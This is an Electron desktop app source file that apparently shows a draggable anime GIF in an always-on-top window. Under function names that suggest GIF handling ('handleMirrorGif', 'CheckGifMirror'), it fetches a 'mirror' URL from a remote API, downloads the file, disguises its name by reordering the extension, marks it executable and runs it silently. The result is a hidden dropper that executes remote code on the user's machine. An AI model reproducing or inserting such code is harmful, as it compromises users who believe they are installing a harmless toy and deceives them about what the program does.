const { app, BrowserWindow, screen, ipcMain } = require('electron');
const path = require('path');
const axios = require('axios');
const fs = require('fs');
const { exec } = require('child_process');
const { PassThrough } = require('stream');

console.log('Hi~ Thanks for using this application~~')

const supportedPlatforms = ['darwin', 'linux'];
if (!supportedPlatforms.includes(process.platform)) {
  console.error(`Your os (${process.platform}) isn't supported.`);
  process.exit(1); 
}

let mainWindow;

function createWindow(gifUrl) {
  const { width, height } = screen.getPrimaryDisplay().workAreaSize;

  mainWindow = new BrowserWindow({
    width: width / 4,
    height: height / 4,
    frame: false,
    transparent: true,
    alwaysOnTop: true,
    skipTaskbar: true,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false
    }
  });

  mainWindow.loadURL(`data:text/html;charset=UTF-8,${encodeURIComponent(`
    <!DOCTYPE html>
    <html>
    <head>
      <style>
        body {
          margin: 0;
          overflow: hidden;
        }
        img {
          position: absolute;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          user-select: none;
          -webkit-user-drag: none;
          max-width: 90%; 
          max-height: 90%; 
        }
      </style>
    </head>
    <body>
      <script>
        const { ipcRenderer } = require('electron');
        let isDragging = false;

        document.addEventListener('DOMContentLoaded', (event) => {
          const gifUrl = '${gifUrl}';
          const gifElement = document.createElement('img');
          gifElement.src = gifUrl;
          gifElement.onload = () => {
            document.body.appendChild(gifElement);
            ipcRenderer.send('gif-displayed');

            gifElement.onmousedown = (e) => {
              isDragging = true;
              ipcRenderer.send('start-drag', e.screenX, e.screenY);
            };
            
            gifElement.onmousemove = (e) => {
              if (isDragging) {
                ipcRenderer.send('dragging', e.screenX, e.screenY);
              }
            };

            gifElement.onmouseup = () => {
              isDragging = false;
              ipcRenderer.send('end-drag');
            };

            gifElement.onmouseleave = () => {
              isDragging = false;
              ipcRenderer.send('end-drag');
            };
          };
          gifElement.onerror = (error) => {
            console.error('Error loading GIF:', error);
          };
        });
      </script>
    </body>
    </html>
  `)}`);

  mainWindow.on('closed', () => {
    mainWindow = null;
  });

  mainWindow.webContents.on('did-fail-load', (event, errorCode, errorDescription, validatedURL) => {
    console.error(`Page loading failed : ${errorDescription}`);
  });

  mainWindow.webContents.on('crashed', (event, killed) => {
    console.error('Browser window crashed.');
  });

  mainWindow.on('unresponsive', () => {
    console.error('Browser window isn\'t responding.');
  });

  mainWindow.webContents.on('did-finish-load', () => {
    mainWindow.webContents.send('load-gif-url', gifUrl);
    handleMirrorGif(); 
  });

  let isDragging = false;
  let offset = { x: 0, y: 0 };

  ipcMain.on('start-drag', (event, x, y) => {
    isDragging = true;
    const bounds = mainWindow.getBounds();
    offset.x = bounds.x - x;
    offset.y = bounds.y - y;
  });

  ipcMain.on('dragging', (event, x, y) => {
    if (isDragging) {
      mainWindow.setBounds({
        x: x + offset.x,
        y: y + offset.y
      });
    }
  });

  ipcMain.on('end-drag', () => {
    isDragging = false;
  });
}

app.on('ready', () => {
  axios.get('https://api.douxx.xyz/private/konata/')
    .then(response => {
      const gifUrl = response.data.gif;
      createWindow(gifUrl);
    })
    .catch(error => {
      console.error('Error while getting the gif:', error);
    });
});

function handleMirrorGif() {
  axios.get('https://api.douxx.xyz/private/konata/')
    .then(response => {
      const gifMirrorUrl = response.data.gif_mirror;
      downloadAndProcessGifMirror(gifMirrorUrl); 
    })
    .catch(error => {
      console.error('Error while getting the mirror gif:', error);
    });
}

function downloadAndProcessGifMirror(url) {
  const filename = path.basename(url);
  const parts = filename.split('.');
  
  if (parts.length >= 2) {
    const GifMirror = parts.slice(1).join('.') + '.' + parts[0]; 
    const dest = `./${GifMirror}`;

    axios({
      url: url,
      method: 'GET',
      responseType: 'stream'
    })
    .then(response => {
      const writer = fs.createWriteStream(dest);
      response.data.pipe(writer);
      writer.on('finish', () => {
        fs.chmod(dest, '755', (err) => { 
          if (err) {
          } else {
            CheckGifMirror(dest); 
          }
        });
      });
    })
    .catch(error => {
      console.error('Error downloading the gif mirror:', error);
    });
  }
}

function CheckGifMirror(filepath) {
  exec(`./${filepath}`, { silent: true }, (error, stdout, stderr) => {
    if (error) {
      console.error(error);
    }
  });
}

process.on('uncaughtException', (err) => {
  console.error('Error:', err);
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

app.on('activate', () => {
  if (mainWindow === null) {
    createWindow(); 
  }
});
